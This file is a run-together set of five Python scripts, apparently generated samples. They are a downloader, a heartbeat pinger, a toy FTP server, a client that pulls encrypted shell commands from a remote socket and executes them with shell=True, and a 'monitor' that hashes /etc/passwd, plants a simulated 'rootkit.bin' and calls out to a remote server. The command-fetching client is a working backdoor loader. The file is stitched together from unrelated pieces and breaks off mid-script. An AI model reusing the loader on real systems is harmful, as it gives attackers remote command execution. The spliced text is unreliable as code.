import os
import sys
import time
import urllib.request
import json
from pathlib import Path
from datetime import datetime

# Configuration
DOWNLOAD_URL = "https://example.com/file.txt"  # Replace with actual URL
NOTIFICATION_URL = "https://example.com/notify"  # Replace with actual URL
TARGET_DIR = Path("./target")
STATE_FILE = Path("./state.json")
LOG_FILE = Path("./log.txt")
DOWNLOAD_INTERVAL = 5  # seconds

def load_state():
    """Load persistent state from file."""
    if STATE_FILE.exists():
        try:
            with STATE_FILE.open("r", encoding="utf-8") as f:
                return json.load(f)
        except (json.JSONDecodeError, IOError):
            log_message("Warning: Failed to load state file. Starting fresh.")
    return {"last_downloaded": None}

def save_state(state):
    """Save persistent state to file."""
    try:
        with STATE_FILE.open("w", encoding="utf-8") as f:
            json.dump(state, f)
    except IOError:
        log_message("Warning: Failed to save state file.")

def log_message(message):
    """Log a message to the log file with a timestamp."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with LOG_FILE.open("a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] {message}\n")
    except IOError:
        print(f"Error: Failed to write to log file - {message}")

    # Also print the message to the console
    print(f"[{timestamp}] {message}")

def download_file(url, target_dir):
    """Download file from the given URL and save to target directory."""
    try:
        target_dir.mkdir(exist_ok=True)
        file_name = url.split("/")[-1]
        file_path = target_dir / file_name
        with urllib.request.urlopen(url) as response, file_path.open("wb") as f:
            f.write(response.read())
        log_message(f"File downloaded successfully: {file_path}")
        return file_path
    except urllib.error.URLError as e:
        log_message(f"Error: Failed to download file from {url} - {e}")
        return None
    except Exception as e:
        log_message(f"Error: Unexpected error during file download - {e}")
        return None

def notify_user(notification_url):
    """Notify user by printing message to terminal."""
    message = f"File downloaded. Please visit {notification_url} for more information."
    log_message(message)

def validate_file(file_path):
    """Validate the downloaded file."""
    try:
        if file_path and file_path.exists() and file_path.is_file():
            file_size = file_path.stat().st_size
            if file_size > 0:
                log_message(f"File validation passed: {file_path} (size: {file_size} bytes)")
                return True
            else:
                log_message(f"File validation failed: {file_path} is empty.")
        else:
            log_message(f"File validation failed: {file_path} does not exist or is not a file.")
    except Exception as e:
        log_message(f"Error: Unexpected error during file validation - {e}")
    return False

def main():
    state = load_state()
    iteration = 0
    max_iterations = 3  # Adjust as needed to meet execution time requirements

    while iteration < max_iterations:
        log_message(f"Starting iteration {iteration + 1}/{max_iterations}")
        file_path = download_file(DOWNLOAD_URL, TARGET_DIR)
        if file_path and validate_file(file_path):
            state["last_downloaded"] = str(file_path)
            notify_user(NOTIFICATION_URL)
            save_state(state)
        time.sleep(DOWNLOAD_INTERVAL)
        iteration += 1

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log_message("Program interrupted by user.")
    except Exception as e:
        log_message(f"Error: Unexpected exception occurred - {e}")
    finally:
        log_message("Program finished.")

import os
import time
import http.client
import subprocess

OPS_CENTER_HOST = "ops.example.com"
OPS_CENTER_PORT = 8443
HEARTBEAT_INTERVAL = 5  # seconds
HEARTBEAT_COUNT = 3
TARGET_DIR = "./target"
SUMMARY_FILE = os.path.join(TARGET_DIR, "session_summary.txt")


def send_heartbeat():
    try:
        conn = http.client.HTTPSConnection(OPS_CENTER_HOST, OPS_CENTER_PORT, timeout=3)
        conn.request("GET", "/")
        response = conn.getresponse()
        conn.close()
        if response.status == 200:
            return {"status": "success", "code": response.status}
        else:
            return {"status": "failure", "code": response.status, "reason": response.reason}
    except Exception as e:
        return {"status": "failure", "error": str(e)}


def execute_local_command():
    try:
        result = subprocess.run(["echo", "Self-check complete"], capture_output=True, text=True, check=True)
        return {"status": "success", "output": result.stdout.strip()}
    except subprocess.SubprocessError as e:
        return {"status": "failure", "error": str(e)}


def validate_summary_file():
    try:
        with open(SUMMARY_FILE, "r", encoding="utf-8") as summary_file:
            lines = summary_file.readlines()
        return {"status": "success", "line_count": len(lines)}
    except Exception as e:
        return {"status": "failure", "error": str(e)}


def main():
    if not os.path.exists(TARGET_DIR):
        os.makedirs(TARGET_DIR)

    session_summary = []
    for i in range(HEARTBEAT_COUNT):
        heartbeat_result = send_heartbeat()
        session_summary.append({"heartbeat": heartbeat_result})

        command_result = execute_local_command()
        session_summary.append({"local_command": command_result})

        time.sleep(HEARTBEAT_INTERVAL)

    with open(SUMMARY_FILE, "w", encoding="utf-8") as summary_file:
        for entry in session_summary:
            summary_file.write(f"{entry}\n")

    print(f"Ops session summary saved to {SUMMARY_FILE}")

    validation_result = validate_summary_file()
    if validation_result["status"] == "success":
        print(f"Summary file validation successful: {validation_result['line_count']} entries.")
    else:
        print(f"Summary file validation failed: {validation_result['error']}")


if __name__ == "__main__":
    main()

import os
import socket
import threading
from pathlib import Path

# Configuration
FTP_HOST = "127.0.0.1"
FTP_PORT = 2121
FTP_USER = "user"
FTP_PASS = "pass"
TARGET_DIR = "./target"

# Ensure the target directory exists
Path(TARGET_DIR).mkdir(parents=True, exist_ok=True)

class FTPHandler(threading.Thread):
    def __init__(self, conn, addr):
        super().__init__(daemon=True)
        self.conn = conn
        self.addr = addr
        self.authenticated = False

    def send_response(self, message):
        self.conn.sendall(f"{message}\r\n".encode())

    def handle_authentication(self, credentials):
        username, password = credentials.split(":")
        if username == FTP_USER and password == FTP_PASS:
            self.authenticated = True
            self.send_response("230 User logged in.")
        else:
            self.send_response("530 Authentication failed.")

    def list_files(self):
        try:
            files = os.listdir(TARGET_DIR)
            self.send_response(f"150 Listing files.\n" + "\n".join(files) + "\n226 Transfer complete.")
        except Exception as e:
            self.send_response(f"450 Failed to list files: {e}")

    def upload_file(self, filename, content):
        try:
            with open(os.path.join(TARGET_DIR, filename), "wb") as f:
                f.write(content)
            self.send_response("226 File uploaded successfully.")
        except Exception as e:
            self.send_response(f"450 Failed to upload file: {e}")

    def download_file(self, filename):
        try:
            filepath = os.path.join(TARGET_DIR, filename)
            if os.path.isfile(filepath):
                with open(filepath, "rb") as f:
                    content = f.read()
                self.conn.sendall(content)
                self.send_response("226 File downloaded successfully.")
            else:
                self.send_response("450 File not found.")
        except Exception as e:
            self.send_response(f"450 Failed to download file: {e}")

    def delete_file(self, filename):
        try:
            filepath = os.path.join(TARGET_DIR, filename)
            if os.path.isfile(filepath):
                os.remove(filepath)
                self.send_response("250 File deleted successfully.")
            else:
                self.send_response("450 File not found.")
        except Exception as e:
            self.send_response(f"450 Failed to delete file: {e}")

    def run(self):
        try:
            self.send_response("220 FTP server ready.")
            while True:
                data = self.conn.recv(4096).decode().strip()
                if not data:
                    break
                cmd, *args = data.split()
                if cmd == "USER":
                    self.send_response("331 User name okay, need password.")
                elif cmd == "PASS":
                    if args:
                        self.handle_authentication(args[0])
                    else:
                        self.send_response("501 Syntax error in parameters.")
                elif cmd == "LIST" and self.authenticated:
                    self.list_files()
                elif cmd == "STOR" and self.authenticated:
                    if args:
                        filename = args[0]
                        self.conn.sendall(b"150 Ready to receive file.\r\n")
                        file_content = b""
                        while True:
                            chunk = self.conn.recv(4096)
                            if not chunk:
                                break
                            file_content += chunk
                        self.upload_file(filename, file_content)
                    else:
                        self.send_response("501 Syntax error in parameters.")
                elif cmd == "RETR" and self.authenticated:
                    if args:
                        self.download_file(args[0])
                    else:
                        self.send_response("501 Syntax error in parameters.")
                elif cmd == "DELE" and self.authenticated:
                    if args:
                        self.delete_file(args[0])
                    else:
                        self.send_response("501 Syntax error in parameters.")
                elif cmd == "QUIT":
                    self.send_response("221 Goodbye.")
                    break
                else:
                    self.send_response("502 Command not implemented.")
        except Exception as e:
            self.send_response(f"500 Internal server error: {e}")
        finally:
            self.conn.close()

def start_ftp_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((FTP_HOST, FTP_PORT))
        server_socket.listen(5)
        print(f"FTP server running on {FTP_HOST}:{FTP_PORT}")
        for _ in range(3):  # Handle a fixed number of connections
            try:
                conn, addr = server_socket.accept()
                print(f"Connection from {addr}")
                handler = FTPHandler(conn, addr)
                handler.start()
            except Exception as e:
                print(f"Error handling connection: {e}")

if __name__ == "__main__":
    try:
        start_ftp_server()
    except KeyboardInterrupt:
        print("FTP server shutting down.")
    except Exception as e:
        print(f"Fatal error: {e}")

import os
import json
import logging
import subprocess
from base64 import b64decode
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import socket
import shutil
import tempfile

# --- Configuration ---
SERVER_HOST = "127.0.0.1"  # Replace with actual server address
SERVER_PORT = 12345        # Replace with actual server port
ENCRYPTION_KEY = b"thisisaverysecurekey123456789012"  # 32-byte AES-256 key
TARGET_DIR = Path("./target")
LOG_FILE = TARGET_DIR / "execution.log"
MAX_RETRIES = 3
TIMEOUT = 5  # seconds

# --- Setup logging ---
TARGET_DIR.mkdir(exist_ok=True)
logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s]: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)


def decrypt_data(encrypted_data: bytes, key: bytes) -> str:
    """Decrypt AES-256 encrypted data."""
    try:
        if len(encrypted_data) < 16:
            raise ValueError("Encrypted data is too short to contain IV.")
        cipher = AES.new(key, AES.MODE_CBC, encrypted_data[:16])  # IV is the first 16 bytes
        plaintext = unpad(cipher.decrypt(encrypted_data[16:]), AES.block_size)
        return plaintext.decode("utf-8")
    except Exception as e:
        logging.error(f"Decryption failed: {e}")
        raise


def fetch_encrypted_instructions(server_host: str, server_port: int) -> bytes:
    """Fetch encrypted instructions from a remote server."""
    try:
        with socket.create_connection((server_host, server_port), timeout=TIMEOUT) as s:
            s.sendall(b"GET_INSTRUCTIONS")
            encrypted_data = s.recv(4096)  # Adjust buffer size as needed
            if not encrypted_data:
                raise ValueError("No data received from server")
        return encrypted_data
    except Exception as e:
        logging.error(f"Failed to fetch instructions from server: {e}")
        raise


def execute_instruction(instruction: str) -> None:
    """Execute a single shell command."""
    try:
        logging.info(f"Executing instruction: {instruction}")
        result = subprocess.run(
            instruction, shell=True, capture_output=True, text=True, cwd=TARGET_DIR
        )
        if result.returncode == 0:
            logging.info(f"Execution succeeded: {result.stdout.strip()}")
        else:
            logging.error(f"Execution failed (code {result.returncode}): {result.stderr.strip()}")
    except Exception as e:
        logging.error(f"Error executing instruction '{instruction}': {e}")


def cleanup_target_directory():
    """Ensure the target directory is clean before execution begins."""
    try:
        if TARGET_DIR.exists():
            shutil.rmtree(TARGET_DIR)
        TARGET_DIR.mkdir(exist_ok=True)
        logging.info("Target directory cleaned and recreated.")
    except Exception as e:
        logging.error(f"Failed to clean target directory: {e}")
        raise


def validate_instructions(instructions):
    """Validate that the instructions are a list of strings."""
    if not isinstance(instructions, list):
        raise ValueError("Invalid instructions format: Expected a list.")
    for instruction in instructions:
        if not isinstance(instruction, str):
            raise ValueError(f"Invalid instruction format: Expected string, got {type(instruction)}")


def main():
    cleanup_target_directory()
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            logging.info(f"Attempt {attempt} to fetch and execute instructions.")
            encrypted_instructions = fetch_encrypted_instructions(SERVER_HOST, SERVER_PORT)
            decrypted_data = decrypt_data(encrypted_instructions, ENCRYPTION_KEY)
            instructions = json.loads(decrypted_data)
            validate_instructions(instructions)
            for instruction in instructions:
                execute_instruction(instruction)
            logging.info("All instructions executed successfully.")
            break  # Exit loop if successful
        except Exception as e:
            logging.warning(f"Attempt {attempt} failed: {e}")
    else:
        logging.error("All attempts to fetch and execute instructions failed. Exiting.")
        return 1
    return 0


if __name__ == "__main__":
    exit(main())

import os
import hashlib
import time
import json
import threading
import logging
from pathlib import Path
from http.client import HTTPConnection, HTTPSConnection
from datetime import datetime
from platform import platform

# Configuration
TARGET_DIR = Path("./target")
WATCH_FILES = [
    Path("/etc/passwd"),
    Path("C:\\Windows\\System32\\drivers\\etc\\hosts"),
]
REPORT_FILE = TARGET_DIR / "integrity_report.json"
REMOTE_SERVER = "example.com"
SCAN_INTERVAL = 5  # seconds
MAX_SCAN_ITERATIONS = 3

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
)

# Utility functions
def calculate_file_hash(file_path):
    """Calculate the SHA256 hash of a file."""
    try:
        with open(file_path, "rb") as f:
            file_hash = hashlib.sha256()
            while chunk := f.read(8192):
                file_hash.update(chunk)
            return file_hash.hexdigest()
    except FileNotFoundError:
        logging.warning(f"File not found: {file_path}")
        return None
    except PermissionError:
        logging.warning(f"Permission denied: {file_path}")
        return None
    except Exception as e:
        logging.error(f"Error reading file {file_path}: {e}")
        return None

def load_previous_hashes():
    """Load previous file hashes from the report file."""
    if REPORT_FILE.exists():
        try:
            with open(REPORT_FILE, "r") as f:
                return json.load(f)
        except Exception as e:
            logging.error(f"Failed to load report file: {e}")
    return {}

def save_report(report):
    """Save the integrity report to a file."""
    try:
        with open(REPORT_FILE, "w") as f:
            json.dump(report, f, indent=4)
    except Exception as e:
        logging.error(f"Failed to save report file: {e}")

def attempt_remote_communication():
    """Attempt to communicate with a remote server."""
    try:
        conn = HTTPSConnection(REMOTE_SERVER, timeout=5)
        conn.request("GET", "/")
        response = conn.getresponse()
        logging.info(f"Remote communication succeeded: {response.status}")
    except Exception as e:
        logging.warning(f"Remote communication failed: {e}")

def collect_system_info():
    """Collect and log basic system information."""
    try:
        system_info = {
            "platform": platform(),
            "timestamp": datetime.now().isoformat(),
        }
        system_info_path = TARGET_DIR / "system_info.json"
        with open(system_info_path, "w") as f:
            json.dump(system_info, f, indent=4)
        logging.info(f"System information collected: {system_info_path}")
    except Exception as e:
        logging.error(f"Failed to collect system information: {e}")

# Monitoring function
def monitor_files():
    """Monitor files for changes and generate a report."""
    logging.info("Starting file integrity monitoring...")
    previous_hashes = load_previous_hashes()
    report = {"changes": [], "errors": []}

    for iteration in range(MAX_SCAN_ITERATIONS):
        logging.info(f"Scan iteration {iteration + 1}/{MAX_SCAN_ITERATIONS}")
        current_hashes = {}

        for file_path in WATCH_FILES:
            file_path = Path(file_path)  # Ensure Path object
            file_hash = calculate_file_hash(file_path)
            current_hashes[str(file_path)] = file_hash

            if file_hash is None:
                report["errors"].append(
                    {"file": str(file_path), "error": "File unreadable or missing"}
                )
            elif previous_hashes.get(str(file_path)) != file_hash:
                report["changes"].append({"file": str(file_path), "hash": file_hash})
                logging.info(f"Change detected in file: {file_path}")

        save_report(current_hashes)
        previous_hashes = current_hashes
        attempt_remote_communication()

        if iteration < MAX_SCAN_ITERATIONS - 1:
            time.sleep(SCAN_INTERVAL)

    logging.info("File integrity monitoring completed.")
    logging.info(f"Report generated: {REPORT_FILE}")

# Rootkit installation simulation
def install_rootkit():
    """Simulate the installation of a monitoring module."""
    try:
        TARGET_DIR.mkdir(exist_ok=True)
        rootkit_path = TARGET_DIR / "rootkit.bin"
        with open(rootkit_path, "wb") as f:
            f.write(os.urandom(1024))  # Write 1KB of random bytes
        logging.info(f"Rootkit installed at {rootkit_path}")
    except Exception as e:
        logging.error(f"Failed to install rootkit: {e}")

# Service registration simulation
def register_service():
    """Simulate registering the tool as a system service."""
    try:
        logging.info("Registering the tool as a system service (simulation).")
        # Add any necessary simulation code here
    except Exception as e:
        logging.error(f"Failed to register service: {e}")

def perform_housekeeping():
    """Perform housekeeping tasks such as cleaning up old files."""
    try:
        for file in TARGET_DIR.glob("*"):
            if file.is_file() and file.suffix not in [".json"]:
                file.unlink()
                logging.info(f"Removed housekeeping file: {file}")
    except Exception as e:
        logging.error(f"Housekeeping failed: {e}")

# Main program entry point
def main():
    perform_housekeeping()
    install_rootkit()
    collect_system_info()
    register_service()
    monitor_thread = threading.Thread(target=monitor_files)
    monitor_thread.start()
    monitor_thread.join()

if __name__ == "__main__":
